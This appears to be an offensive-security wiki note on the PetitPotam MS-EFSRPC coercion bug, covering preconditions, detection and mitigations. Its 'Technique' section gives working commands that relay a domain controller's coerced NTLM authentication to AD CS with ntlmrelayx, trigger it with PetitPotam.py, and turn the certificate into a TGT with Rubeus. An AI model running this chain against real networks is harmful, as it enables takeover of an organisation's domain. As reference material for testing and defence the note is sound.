---
title: PetitPotam Coercion
slug: petitpotam-coercion
---

> **TL;DR:** Call `EfsRpcOpenFileRaw` over MS-EFSR against a domain controller and it will helpfully NTLM-authenticate to a UNC path you control — relay that into AD CS for a DC certificate and the domain is yours.

## What it is
PetitPotam (Gilles Lionel / @topotam77, 2021) is an authentication coercion bug in MS-EFSRPC, the Encrypting File System Remote Protocol. The vulnerable surface is `efslsaext.dll`, originally reachable unauthenticated over the `\PIPE\lsarpc` named pipe via the `EfsRpcOpenFileRaw` opnum. By passing a UNC path as the filename, the server attempts to open it — generating an outbound NTLM authentication as the machine account. The coerced auth is then relayed (commonly via `ntlmrelayx`) to AD CS Web Enrollment to obtain a certificate for the DC's machine account, which yields TGTs via PKINIT and ultimately [[dcsync]].

## Preconditions / where it applies
- Network reachability to the target's lsarpc/efsrpc pipe (SMB 445)
- Pre-KB5005413: unauthenticated; post-patch: requires any domain user
- Most lethal when chained with [[adcs-attacks]] ESC8 (AD CS HTTP enrollment without EPA)
- Mitigated end-to-end only by enforcing EPA + SMB signing + LDAP channel binding ([[ntlm-relay-ws2025-mitigations]])

## Technique
Two terminals: one to listen with the relay, one to fire the coercion at the DC.

```bash
# Terminal 1 — relay coerced NTLM to AD CS Web Enrollment
impacket-ntlmrelayx -t http://CA01/certsrv/certfnsh.asp \
    --adcs --template DomainController -smb2support

# Terminal 2 — coerce DC01 to authenticate to attacker (10.0.0.5)
python3 PetitPotam.py -u low_priv -p Password1 \
    10.0.0.5 dc01.corp.local
# resulting cert -> Rubeus asktgt /user:DC01$ /certificate:dc.pfx /getcredentials
```

If `EfsRpcOpenFileRaw` is patched, the protocol exposes a dozen sibling functions (`EfsRpcEncryptFileSrv`, `EfsRpcDecryptFileSrv`, `EfsRpcQueryUsersOnFile`, etc.) that PetitPotam will fall back to. DFSCoerce, PrinterBug, ShadowCoerce, and Coercer are interchangeable triggers for the same relay chain.

## Detection and defence
- 4624/4625 logons on the relay target with anomalous source-IP / machine-account combinations
- RPC filter to block opnums 0,4,5,7,9,10,11,12,13,14,15 on UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`
- Enforce Extended Protection for Authentication on AD CS HTTP endpoints, disable NTLM where possible
- KB5005413 + Microsoft's MS-EFSR mitigation registry value `HKLM\SYSTEM\…\EFS\SuppressExtendedProtection=0`

## References
- [topotam/PetitPotam](https://github.com/topotam/PetitPotam) — original PoC
- [CERT/CC VU#405600](https://www.kb.cert.org/vuls/id/405600) — advisory tying PetitPotam to AD CS relay compromise
